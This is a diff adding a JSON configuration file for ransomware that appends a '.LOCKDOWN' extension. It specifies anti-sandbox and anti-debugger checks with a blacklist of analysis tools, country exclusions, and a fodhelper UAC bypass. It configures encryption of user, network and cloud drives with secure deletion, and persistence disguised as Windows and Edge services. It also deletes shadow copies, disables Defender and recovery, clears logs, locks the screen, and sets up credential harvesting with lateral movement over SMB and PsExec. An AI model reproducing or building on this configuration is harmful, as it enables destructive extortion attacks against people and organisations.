@@ -1,0 +1,241 @@
+{
+  "execution": {
+    "delay_start": 120,
+    "random_delay": true,
+    "delay_range": [60, 300],
+    
+    "check_sandbox": true,
+    "check_debugger": true,
+    "check_vm": true,
+    "check_analysis_tools": true,
+    "check_network_monitoring": true,
+    
+    "minimum_ram_gb": 8,
+    "minimum_disk_gb": 500,
+    "minimum_cpu_cores": 4,
+    "minimum_screen_resolution": "1280x720",
+    "check_recent_user_activity": true,
+    "minimum_running_processes": 40,
+    "check_installed_programs": true,
+    "minimum_installed_programs": 50,
+    
+    "geolocation_check": true,
+    "exclude_countries": ["RU", "BY", "KZ"],
+    "target_languages": ["en-US", "en-GB", "de-DE", "fr-FR"],
+    
+    "admin_privileges_required": false,
+    "uac_bypass_method": "fodhelper",
+    "privilege_escalation": true,
+    "token_manipulation": true
+  },
+  
+  "encryption": {
+    "threads": 16,
+    "chunk_size": 10485760,
+    "buffer_size": 1048576,
+    "progress_callback": false,
+    "verify_integrity": true,
+    "secure_delete_passes": 3,
+    "overwrite_original": true,
+    
+    "encryption_speed": "maximum",
+    "cpu_usage_limit": 90,
+    "memory_usage_limit": "4GB",
+    
+    "file_size_limits": {
+      "minimum": 1024,
+      "maximum": 10737418240
+    },
+    
+    "skip_system_files": true,
+    "encrypt_network_drives": true,
+    "encrypt_removable_drives": true,
+    "encrypt_cloud_sync_folders": true,
+    
+    "file_extension_spoofing": true,
+    "add_ransom_extension": ".LOCKDOWN",
+    "preserve_file_structure": false,
+    
+    "target_priority_folders": [
+      "%USERPROFILE%\\Documents",
+      "%USERPROFILE%\\Desktop", 
+      "%USERPROFILE%\\Pictures",
+      "%USERPROFILE%\\Videos",
+      "%USERPROFILE%\\Music",
+      "C:\\Users\\Public",
+      "D:\\",
+      "E:\\",
+      "F:\\",
+      "\\\\*\\*"
+    ]
+  },
+  
+  "persistence": {
+    "methods": [
+      "registry_run_keys",
+      "registry_runonce_keys", 
+      "scheduled_task",
+      "windows_service",
+      "startup_folder",
+      "wmi_event_subscription",
+      "dll_hijacking",
+      "com_hijacking"
+    ],
+    
+    "service_name": "WindowsSecurityHealthService",
+    "service_description": "Provides security health monitoring",
+    "service_type": "win32_own_process",
+    "service_start": "auto",
+    
+    "task_name": "MicrosoftEdgeUpdateTaskMachineUA",
+    "task_description": "Keeps Microsoft Edge up to date",
+    "task_trigger": "logon",
+    "task_hidden": true,
+    "task_highest_privileges": true,
+    
+    "registry_keys": [
+      "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+    ],
+    
+    "startup_name": "SecurityHealthTray",
+    "startup_description": "Security Health System Tray",
+    
+    "mutex_name": "Global\\{B7D5C4F8-9A1E-4D2C-8B3F-6E5A9C7D4F1B}",
+    "prevent_multiple_instances": true
+  },
+  
+  "network": {
+    "user_agents": [
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101",
+      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+    ],
+    "connect_timeout": 60,
+    "read_timeout": 120,
+    "max_redirects": 10,
+    "retry_attempts": 5,
+    "proxy_support": true,
+    "tor_routing": true,
+    "traffic_obfuscation": true
+  },
+  
+  "anti_analysis": {
+    "process_monitoring": {
+      "blacklisted_processes": [
+        "ollydbg.exe", "ida.exe", "ida64.exe", "idaq.exe", "idaw.exe",
+        "x32dbg.exe", "x64dbg.exe", "windbg.exe", "immunity debugger.exe",
+        "procmon.exe", "procmon64.exe", "process monitor.exe",
+        "wireshark.exe", "fiddler.exe", "burpsuite.exe", "tcpview.exe",
+        "regshot.exe", "regshot-x64-ansi.exe", "regshot-unicode.exe",
+        "autoruns.exe", "autorunsc.exe", "filemon.exe", "regmon.exe",
+        "pestudio.exe", "die.exe", "pe-bear.exe", "cff explorer.exe",
+        "resource hacker.exe", "reshacker.exe", "hiew32.exe",
+        "vmware.exe", "vmtoolsd.exe", "vboxtray.exe", "vboxservice.exe",
+        "sandboxie.exe", "sbiesvc.exe", "cuckoo.exe", "analysis.exe"
+      ],
+      "terminate_on_detection": true,
+      "process_check_interval": 5
+    },
+    
+    "file_monitoring": {
+      "blacklisted_files": [
+        "C:\\analysis", "C:\\malware", "C:\\sample", "C:\\virus",
+        "vmware", "vbox", "virtualbox", "sandbox", "cuckoo"
+      ],
+      "registry_monitoring": true,
+      "mutex_monitoring": true
+    },
+    
+    "timing_checks": {
+      "rdtsc_checks": true,
+      "sleep_acceleration": true,
+      "gettickcoun_checks": true,
+      "performance_counter_checks": true
+    },
+    
+    "interaction_checks": {
+      "mouse_movement": true,
+      "keyboard_activity": true,
+      "window_focus_changes": true,
+      "minimum_interaction_time": 300
+    },
+    
+    "hardware_checks": {
+      "check_cpu_count": true,
+      "check_memory_size": true,
+      "check_disk_size": true,
+      "check_network_adapters": true,
+      "check_usb_devices": true,
+      "check_audio_devices": true
+    }
+  },
+  
+  "system_modification": {
+    "disable_system_restore": true,
+    "delete_shadow_copies": true,
+    "disable_windows_defender": true,
+    "disable_windows_update": true,
+    "disable_task_manager": true,
+    "disable_registry_editor": true,
+    "disable_command_prompt": true,
+    "disable_powershell": true,
+    "disable_safe_mode": true,
+    "disable_system_recovery": true,
+    
+    "modify_boot_options": true,
+    "disable_startup_repair": true,
+    "clear_event_logs": true,
+    "disable_error_reporting": true,
+    
+    "network_modifications": {
+      "block_security_domains": true,
+      "redirect_update_servers": true,
+      "modify_host_file": true,
+      "disable_windows_firewall": false
+    }
+  },
+  
+  "ui": {
+    "show_progress": false,
+    "show_countdown": true,
+    "change_wallpaper": true,
+    "lock_screen": true,
+    "fullscreen_message": true,
+    "disable_ctrl_alt_del": true,
+    "disable_alt_tab": true,
+    "disable_windows_key": true,
+    "play_audio_message": false,
+    "flash_screen": true,
+    "mouse_restriction": false
+  },
+  
+  "logging": {
+    "file": ".\\logs\\system_activity.enc",
+    "max_size": 104857600,
+    "encrypt": true,
+    "compress": true,
+    "upload_logs": true,
+    "debug": false,
+    "log_level": "ERROR",
+    "log_victims": true,
+    "log_files_encrypted": true,
+    "log_system_info": true,
+    "log_network_activity": true
+  },
+  
+  "lateral_movement": {
+    "enabled": true,
+    "methods": ["smb", "wmi", "rdp", "psexec", "powershell_remoting"],
+    "credential_harvesting": true,
+    "network_scanning": true,
+    "share_enumeration": true,
+    "admin_share_access": true,
+    "service_installation": true,
+    "scheduled_task_creation": true,
+    "max_spread_targets": 50,
+    "spread_delay": 30,
+    "avoid_detection": true
+  }
+}
